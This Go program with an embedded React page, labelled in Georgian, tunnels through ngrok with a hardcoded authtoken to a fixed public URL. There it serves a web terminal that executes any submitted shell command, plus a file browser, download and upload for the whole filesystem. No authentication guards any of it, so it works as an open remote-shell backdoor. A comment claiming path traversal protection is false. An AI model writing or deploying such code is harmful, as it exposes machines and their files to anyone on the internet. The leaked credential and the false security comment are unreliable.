package main

import (
	"context"
	"encoding/json"
	"fmt"
	"html/template"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.ngrok.com/ngrok/v2"
)

var (
	activeCmd  *exec.Cmd
	cmdMu      sync.Mutex
	currentDir string
	agent      ngrok.Agent
	ln         net.Listener
)

func init() {
	currentDir, _ = os.Getwd()
}

func main() {
	startNgrok()
}

func startNgrok() {
	var err error
	ctx := context.Background()

	agent, err = ngrok.NewAgent( ngrok.WithAuthtoken("36gmx4MIeEG3BrAIUf9RiRC8Dzg_3g7KHHphRsiWQzNsQcJXu"), 
	)
	if err != nil {
		fmt.Println("Agent error:", err)
		return
	}

	ln, err = agent.Listen(
		ctx,
		ngrok.WithURL("liked-together-mantis.ngrok-free.app"),
	)
	if err != nil {
		fmt.Println("Listener error:", err)
		return
	}

	fmt.Printf("Terminal Online: %s\n", ln.Addr().String())

	mux := http.NewServeMux()
	mux.HandleFunc("/", handler)
	mux.HandleFunc("/files", filesHandler)
	mux.HandleFunc("/download", downloadHandler)
	mux.HandleFunc("/upload", uploadHandler)

	err = http.Serve(ln, mux)
	if err != nil {
		fmt.Println("Server stopped:", err)
	}
}

func stopNgrok() {
	fmt.Println("Shutting down...")
	if ln != nil {
		ln.Close()
	}
	if agent != nil {
		agent.Disconnect()
		agent = nil
	}
	fmt.Println("Ngrok server fully stopped")
}

// ─── Terminal Handler ────────────────────────────────────────────────────────

func handler(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		tpl, err := template.New("tpl").Parse(html_tpl)
		if err != nil {
			http.Error(w, "Template error", 500)
			return
		}
		tpl.Execute(w, nil)
		return
	}

	if r.Method == "POST" {
		r.ParseForm()
		command := r.Form.Get("cmd")

		if command == "stop" {
			killProcess(w)
			return
		}

		if command == "stop server" {
			w.Write([]byte("SERVER_STOPPED"))
			go stopNgrok()
			return
		}

		runProcess(w, command)
	}
}

func runProcess(w http.ResponseWriter, cmdStr string) {
	cmdStr = strings.TrimSpace(cmdStr)
	args := strings.Fields(cmdStr)
	if len(args) == 0 {
		return
	}

	if args[0] == "cd" {
		if len(args) < 2 {
			w.Write([]byte(currentDir))
			return
		}
		target := args[1]
		newPath := filepath.Join(currentDir, target)
		if filepath.IsAbs(target) {
			newPath = target
		}
		if info, err := os.Stat(newPath); err == nil && info.IsDir() {
			currentDir = newPath
			w.Write([]byte("Directory changed: " + currentDir))
		} else {
			w.Write([]byte("Error: directory not found: " + target))
		}
		return
	}

	cmdMu.Lock()
	if activeCmd != nil && activeCmd.Process != nil {
		activeCmd.Process.Kill()
	}

	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.CommandContext(ctx, "cmd", "/C", cmdStr)
	} else {
		cmd = exec.CommandContext(ctx, "sh", "-c", cmdStr)
	}

	cmd.Dir = currentDir
	activeCmd = cmd
	cmdMu.Unlock()

	out, err := cmd.CombinedOutput()

	cmdMu.Lock()
	activeCmd = nil
	cmdMu.Unlock()

	if err != nil && len(out) == 0 {
		w.Write([]byte("Error: " + err.Error()))
	} else {
		w.Write(out)
	}
}

func killProcess(w http.ResponseWriter) {
	cmdMu.Lock()
	defer cmdMu.Unlock()
	if activeCmd != nil && activeCmd.Process != nil {
		var err error
		if runtime.GOOS == "windows" {
			kill := exec.Command("taskkill", "/F", "/T", "/PID", strconv.Itoa(activeCmd.Process.Pid))
			err = kill.Run()
		} else {
			err = activeCmd.Process.Kill()
		}
		if err != nil {
			w.Write([]byte("Could not stop process: " + err.Error()))
		} else {
			w.Write([]byte("Process terminated successfully."))
		}
		activeCmd = nil
	} else {
		w.Write([]byte("No active process found to stop."))
	}
}

// ─── File Manager Handlers ───────────────────────────────────────────────────

type FileEntry struct {
	Name    string `json:"name"`
	IsDir   bool   `json:"isDir"`
	Size    int64  `json:"size"`
	ModTime string `json:"modTime"`
	Path    string `json:"path"`
}

func filesHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	reqPath := r.URL.Query().Get("path")
	if reqPath == "" {
		reqPath = currentDir
	}

	// უსაფრთხოების შემოწმება - path traversal დაცვა
	absPath, err := filepath.Abs(reqPath)
	if err != nil {
		http.Error(w, `{"error":"invalid path"}`, 400)
		return
	}

	entries, err := os.ReadDir(absPath)
	if err != nil {
		http.Error(w, `{"error":"cannot read directory"}`, 400)
		return
	}

	var files []FileEntry
	for _, e := range entries {
		info, err := e.Info()
		if err != nil {
			continue
		}
		files = append(files, FileEntry{
			Name:    e.Name(),
			IsDir:   e.IsDir(),
			Size:    info.Size(),
			ModTime: info.ModTime().Format("02 Jan 2006 15:04"),
			Path:    filepath.Join(absPath, e.Name()),
		})
	}

	type Response struct {
		Path    string      `json:"path"`
		Parent  string      `json:"parent"`
		Files   []FileEntry `json:"files"`
	}

	parent := filepath.Dir(absPath)
	if parent == absPath {
		parent = ""
	}

	json.NewEncoder(w).Encode(Response{
		Path:   absPath,
		Parent: parent,
		Files:  files,
	})
}

func downloadHandler(w http.ResponseWriter, r *http.Request) {
	filePath := r.URL.Query().Get("path")
	if filePath == "" {
		http.Error(w, "path required", 400)
		return
	}

	absPath, err := filepath.Abs(filePath)
	if err != nil {
		http.Error(w, "invalid path", 400)
		return
	}

	info, err := os.Stat(absPath)
	if err != nil || info.IsDir() {
		http.Error(w, "file not found", 404)
		return
	}

	w.Header().Set("Content-Disposition", "attachment; filename=\""+filepath.Base(absPath)+"\"")
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", strconv.FormatInt(info.Size(), 10))

	f, err := os.Open(absPath)
	if err != nil {
		http.Error(w, "cannot open file", 500)
		return
	}
	defer f.Close()
	io.Copy(w, f)
}

func uploadHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "method not allowed", 405)
		return
	}

	destDir := r.URL.Query().Get("path")
	if destDir == "" {
		destDir = currentDir
	}

	absDir, err := filepath.Abs(destDir)
	if err != nil {
		http.Error(w, "invalid path", 400)
		return
	}

	r.ParseMultipartForm(100 << 20) // 100MB მაქსიმუმი
	file, header, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "file required", 400)
		return
	}
	defer file.Close()

	destPath := filepath.Join(absDir, filepath.Base(header.Filename))
	out, err := os.Create(destPath)
	if err != nil {
		http.Error(w, "cannot create file: "+err.Error(), 500)
		return
	}
	defer out.Close()

	io.Copy(out, file)
	w.Write([]byte("uploaded: " + header.Filename))
}

// ─── HTML Template ────────────────────────────────────────────────────────────

const html_tpl = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Terminal & Files - Stable Core V12</title>
    <link href="https://fonts.googleapis.com/css?family=Roboto+Mono&display=swap" rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
    <style>
        *, *::before, *::after { box-sizing: border-box; font-family: 'Roboto Mono', monospace; }
        :focus { outline: none; }
        body { margin: 0; overflow: hidden; background-color: #333444; }
        #app { height: 100vh; display: flex; justify-content: center; align-items: center; }
        #terminal { width: 95vw; max-width: 1000px; height: 88vh; box-shadow: 0 20px 50px rgba(0,0,0,0.5); border-radius: 8px; overflow: hidden; display: flex; flex-direction: column; background-color: #222333; }

        /* Title bar */
        #window { height: 40px; display: flex; align-items: center; padding: 0 15px; background-color: #1a1a2e; color: #F4F4F4; flex-shrink: 0; gap: 10px; }
        .dot { width: 12px; height: 12px; border-radius: 50%; }
        #win-title { margin-left: auto; font-size: 11px; opacity: 0.4; }

        /* Tabs */
        #tabs { display: flex; background-color: #1e1e30; flex-shrink: 0; border-bottom: 1px solid #333; }
        .tab { padding: 10px 24px; font-size: 13px; color: #888; cursor: pointer; border-bottom: 2px solid transparent; transition: all 0.2s; user-select: none; }
        .tab:hover { color: #ccc; background: rgba(255,255,255,0.04); }
        .tab.active { color: #2ECC40; border-bottom-color: #2ECC40; background: rgba(46,204,64,0.05); }

        /* Terminal pane */
        #pane-terminal { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
        #field { flex-grow: 1; padding: 20px; overflow-y: auto; color: #F4F4F4; scroll-behavior: smooth; }
        #query { color: #2ECC40; font-weight: bold; margin-right: 10px; }
        .line { margin-bottom: 8px; white-space: pre-wrap; word-break: break-all; line-height: 1.5; font-size: 13px; position: relative; min-height: 20px; }
        #active-input { position: absolute; left: 0; top: 0; width: 100%; height: 100%; opacity: 0; border: none; background: transparent; z-index: 2; cursor: text; }
        #cursor { display: inline-block; width: 8px; height: 14px; background-color: #F4F4F4; animation: 1s blink step-end infinite; vertical-align: middle; }
        @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }

        /* File Manager pane */
        #pane-files { flex: 1; display: flex; flex-direction: column; overflow: hidden; color: #F4F4F4; }
        #fm-toolbar { display: flex; align-items: center; gap: 10px; padding: 10px 16px; background: #1e1e30; flex-shrink: 0; border-bottom: 1px solid #2a2a3e; }
        #fm-path { flex: 1; background: #2a2a40; border: 1px solid #3a3a55; color: #aaa; padding: 5px 10px; border-radius: 4px; font-size: 12px; }
        #fm-search { width: 180px; background: #2a2a40; border: 1px solid #3a3a55; color: #ccc; padding: 5px 10px; border-radius: 4px; font-size: 12px; }
        #fm-search::placeholder { color: #555; }
        .fm-btn { background: #2a2a40; border: 1px solid #3a3a55; color: #aaa; padding: 5px 12px; border-radius: 4px; cursor: pointer; font-size: 12px; white-space: nowrap; }
        .fm-btn:hover { background: #3a3a55; color: #fff; }
        .fm-btn.primary { border-color: #2ECC40; color: #2ECC40; }
        .fm-btn.primary:hover { background: rgba(46,204,64,0.15); }

        #fm-list { flex: 1; overflow-y: auto; padding: 8px; }
        .fm-row { display: flex; align-items: center; gap: 10px; padding: 7px 10px; border-radius: 5px; cursor: pointer; font-size: 13px; transition: background 0.15s; }
        .fm-row:hover { background: rgba(255,255,255,0.06); }
        .fm-row.selected { background: rgba(46,204,64,0.1); }
        .fm-icon { width: 22px; text-align: center; flex-shrink: 0; }
        .fm-name { flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
        .fm-dir { color: #7eb8f7; }
        .fm-file { color: #cccccc; }
        .fm-size { width: 80px; text-align: right; color: #666; font-size: 11px; flex-shrink: 0; }
        .fm-date { width: 130px; text-align: right; color: #555; font-size: 11px; flex-shrink: 0; }
        @media (max-width: 600px) { .fm-size { display: none; } .fm-date { display: none; } }
        .fm-actions { display: flex; gap: 6px; flex-shrink: 0; opacity: 0; transition: opacity 0.15s; }
        .fm-row:hover .fm-actions { opacity: 1; }
        .fm-act-btn { background: none; border: 1px solid #444; color: #888; padding: 2px 8px; border-radius: 3px; cursor: pointer; font-size: 11px; }
        .fm-act-btn:hover { border-color: #2ECC40; color: #2ECC40; }
        #fm-status { padding: 6px 16px; font-size: 11px; color: #555; background: #1a1a2e; flex-shrink: 0; border-top: 1px solid #2a2a3e; }

        /* Upload drop zone */
        #drop-overlay { display: none; position: absolute; inset: 0; background: rgba(46,204,64,0.15); border: 2px dashed #2ECC40; border-radius: 8px; z-index: 100; align-items: center; justify-content: center; font-size: 20px; color: #2ECC40; }
        #drop-overlay.active { display: flex; }
        #pane-files { position: relative; }
    </style>
</head>
<body>
<div id="root"></div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/react/17.0.2/umd/react.production.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/react-dom/17.0.2/umd/react-dom.production.min.js"></script>
<script>
const { Component, useState, useEffect, useRef, useCallback } = React;

// ══════════════════════════════════════════════════════
// TERMINAL
// ══════════════════════════════════════════════════════
class Terminal extends Component {
    constructor(props) {
        super(props);
        this.state = {
            fieldHistory: [{ text: 'Terminal v12.0 Online' }],
            userInput: '',
            commandHistory: [],
            historyIndex: -1
        };
    }
    componentDidMount() { this.inputRef && this.inputRef.focus(); }
    componentDidUpdate(_, prevState) {
        if (prevState.fieldHistory.length !== this.state.fieldHistory.length && this.activeLineRef) {
            this.activeLineRef.scrollIntoView({ behavior: 'smooth', block: 'end' });
        }
    }
    exec(cmd) {
        const c = cmd.trim();
        if (!c) return;
        if (c === 'cls') { this.setState({ fieldHistory: [] }); return; }
        this.setState(s => ({
            commandHistory: [c, ...s.commandHistory.filter(x => x !== c)].slice(0, 100),
            historyIndex: -1
        }));
        const p = new URLSearchParams();
        p.append('cmd', c);
        fetch('/', { method: 'POST', body: p })
            .then(r => r.text())
            .then(result => {
                if (result.includes('SERVER_STOPPED')) {
                    document.body.innerHTML = '<div style="height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;background:#111;color:#2ECC40;font-family:monospace;font-size:24px;">სერვერი გაითიშა.</div>';
                    return;
                }
                this.setState(s => ({ fieldHistory: [...s.fieldHistory, { text: result || 'Done.' }] }));
            })
            .catch(() => this.setState(s => ({ fieldHistory: [...s.fieldHistory, { text: 'კავშირი გაწყდა.' }] })));
    }
    historyKey(e) {
        const { commandHistory, historyIndex } = this.state;
        if (e.key === 'ArrowUp') {
            e.preventDefault();
            if (!commandHistory.length) return;
            const next = historyIndex < commandHistory.length - 1 ? historyIndex + 1 : historyIndex;
            this.setState({ historyIndex: next === -1 ? 0 : next, userInput: commandHistory[next === -1 ? 0 : next] });
        } else if (e.key === 'ArrowDown') {
            e.preventDefault();
            if (historyIndex <= 0) { this.setState({ historyIndex: -1, userInput: '' }); return; }
            const next = historyIndex - 1;
            this.setState({ historyIndex: next, userInput: commandHistory[next] });
        }
    }
    render() {
        return React.createElement('div', { id: 'pane-terminal', style: { display: this.props.active ? 'flex' : 'none' } },
            React.createElement('div', { id: 'field', onClick: () => this.inputRef && this.inputRef.focus() },
                this.state.fieldHistory.map((l, i) =>
                    React.createElement('div', { key: i, className: 'line' },
                        l.isCommand && React.createElement('span', { id: 'query' }, 'RT C:\\>'),
                        React.createElement('span', null, l.text)
                    )
                ),
                React.createElement('div', { className: 'line', ref: el => this.activeLineRef = el },
                    React.createElement('span', { id: 'query' }, 'RT C:\\>'),
                    React.createElement('span', null, this.state.userInput),
                    React.createElement('div', { id: 'cursor' }),
                    React.createElement('input', {
                        ref: el => this.inputRef = el,
                        id: 'active-input',
                        value: this.state.userInput,
                        onChange: e => this.setState({ userInput: e.target.value }),
                        onKeyDown: e => {
                            if (e.key === 'ArrowUp' || e.key === 'ArrowDown') { this.historyKey(e); return; }
                            if (e.key === 'Enter') {
                                const val = this.state.userInput;
                                this.setState(s => ({ fieldHistory: [...s.fieldHistory, { text: val, isCommand: true }], userInput: '' }));
                                this.exec(val);
                            }
                        },
                        autoComplete: 'off', spellCheck: 'false'
                    })
                )
            )
        );
    }
}

// ══════════════════════════════════════════════════════
// FILE MANAGER
// ══════════════════════════════════════════════════════
function formatSize(bytes) {
    if (bytes === 0) return '-';
    const u = ['B','KB','MB','GB'];
    let i = 0, v = bytes;
    while (v >= 1024 && i < u.length - 1) { v /= 1024; i++; }
    return v.toFixed(i > 0 ? 1 : 0) + ' ' + u[i];
}

function FileManager({ active }) {
    const [data, setData] = useState({ path: '', parent: '', files: [] });
    const [search, setSearch] = useState('');
    const [status, setStatus] = useState('');
    const [dropping, setDropping] = useState(false);
    const uploadRef = useRef();

    const load = useCallback((path) => {
        const url = path ? '/files?path=' + encodeURIComponent(path) : '/files';
        fetch(url).then(r => r.json()).then(d => {
            setData(d);
            setSearch('');
            setStatus(d.path);
        }).catch(() => setStatus('შეცდომა: ვერ ჩაიტვირთა'));
    }, []);

    useEffect(() => { if (active) load(''); }, [active]);

    const filtered = (data.files || []).filter(f =>
        !search || f.name.toLowerCase().includes(search.toLowerCase())
    );

    const download = (e, f) => {
        e.stopPropagation();
        window.location.href = '/download?path=' + encodeURIComponent(f.path);
    };

    const handleUpload = (files) => {
        Array.from(files).forEach(file => {
            const fd = new FormData();
            fd.append('file', file);
            setStatus('იტვირთება: ' + file.name + '...');
            fetch('/upload?path=' + encodeURIComponent(data.path), { method: 'POST', body: fd })
                .then(r => r.text())
                .then(msg => { setStatus(msg); load(data.path); })
                .catch(() => setStatus('ატვირთვა ვერ მოხერხდა'));
        });
    };

    const onDrop = e => {
        e.preventDefault(); setDropping(false);
        handleUpload(e.dataTransfer.files);
    };

    const fileIcon = f => f.isDir ? '📁' : (
        f.name.match(/\.(png|jpg|jpeg|gif|svg|webp)$/i) ? '🖼️' :
        f.name.match(/\.(mp4|mkv|avi|mov)$/i) ? '🎬' :
        f.name.match(/\.(mp3|wav|ogg)$/i) ? '🎵' :
        f.name.match(/\.(zip|tar|gz|rar)$/i) ? '📦' :
        f.name.match(/\.(pdf)$/i) ? '📄' :
        f.name.match(/\.(go|js|ts|py|sh|c|cpp|rs)$/i) ? '💻' : '📄'
    );

    return React.createElement('div', {
        id: 'pane-files',
        style: { display: active ? 'flex' : 'none' },
        onDragOver: e => { e.preventDefault(); setDropping(true); },
        onDragLeave: () => setDropping(false),
        onDrop
    },
        // Drop overlay
        React.createElement('div', { id: 'drop-overlay', className: dropping ? 'active' : '' }, '📂 ჩააგდე ატვირთვისთვის'),

        // Toolbar
        React.createElement('div', { id: 'fm-toolbar' },
            data.parent && React.createElement('button', { className: 'fm-btn', onClick: () => load(data.parent) }, '← უკან'),
            React.createElement('input', {
                id: 'fm-path',
                value: data.path || '',
                onChange: e => {},
                onKeyDown: e => e.key === 'Enter' && load(e.target.value),
                readOnly: false
            }),
            React.createElement('input', {
                id: 'fm-search',
                placeholder: '🔍 ძებნა...',
                value: search,
                onChange: e => setSearch(e.target.value)
            }),
            React.createElement('button', { className: 'fm-btn primary', onClick: () => uploadRef.current.click() }, '⬆ ატვირთვა'),
            React.createElement('input', { ref: uploadRef, type: 'file', multiple: true, style: { display: 'none' }, onChange: e => handleUpload(e.target.files) })
        ),

        // File list
        React.createElement('div', { id: 'fm-list' },
            filtered.length === 0 && React.createElement('div', { style: { color: '#555', padding: '20px', textAlign: 'center' } }, search ? 'ვერ მოიძებნა' : 'საქაღალდე ცარიელია'),
            filtered.map((f, i) =>
                React.createElement('div', {
                    key: i,
                    className: 'fm-row',
                    onDoubleClick: () => f.isDir ? load(f.path) : null
                },
                    React.createElement('span', { className: 'fm-icon' }, fileIcon(f)),
                    React.createElement('span', { className: 'fm-name ' + (f.isDir ? 'fm-dir' : 'fm-file') }, f.name),
                    React.createElement('span', { className: 'fm-size' }, f.isDir ? '' : formatSize(f.size)),
                    React.createElement('span', { className: 'fm-date' }, f.modTime),
                    React.createElement('div', { className: 'fm-actions' },
                        f.isDir
                            ? React.createElement('button', { className: 'fm-act-btn', onClick: () => load(f.path) }, 'გახსნა')
                            : React.createElement('button', { className: 'fm-act-btn', onClick: e => download(e, f) }, '⬇ ჩამოტვირთვა')
                    )
                )
            )
        ),

        // Status bar
        React.createElement('div', { id: 'fm-status' },
            status || data.path,
            data.files && React.createElement('span', { style: { marginLeft: '20px', color: '#444' } },
                filtered.length + ' ელემენტი'
            )
        )
    );
}

// ══════════════════════════════════════════════════════
// APP
// ══════════════════════════════════════════════════════
function App() {
    const [tab, setTab] = useState('terminal');
    return React.createElement('div', { id: 'app' },
        React.createElement('div', { id: 'terminal' },
            // Title bar
            React.createElement('div', { id: 'window' },
                React.createElement('div', { style: { display: 'flex', gap: '5px' } },
                    React.createElement('div', { className: 'dot', style: { backgroundColor: '#ff5f56' } }),
                    React.createElement('div', { className: 'dot', style: { backgroundColor: '#ffbd2e' } }),
                    React.createElement('div', { className: 'dot', style: { backgroundColor: '#27c93f' } })
                ),
                React.createElement('span', { id: 'win-title' }, 'STABLE_CORE_V12')
            ),
            // Tabs
            React.createElement('div', { id: 'tabs' },
                React.createElement('div', { className: 'tab ' + (tab === 'terminal' ? 'active' : ''), onClick: () => setTab('terminal') }, '⌨ ტერმინალი'),
                React.createElement('div', { className: 'tab ' + (tab === 'files' ? 'active' : ''), onClick: () => setTab('files') }, '📂 ფაილები')
            ),
            // Panes
            React.createElement(Terminal, { active: tab === 'terminal' }),
            React.createElement(FileManager, { active: tab === 'files' })
        )
    );
}

ReactDOM.render(React.createElement(App), document.querySelector('#root'));
</script>
</body>
</html>`
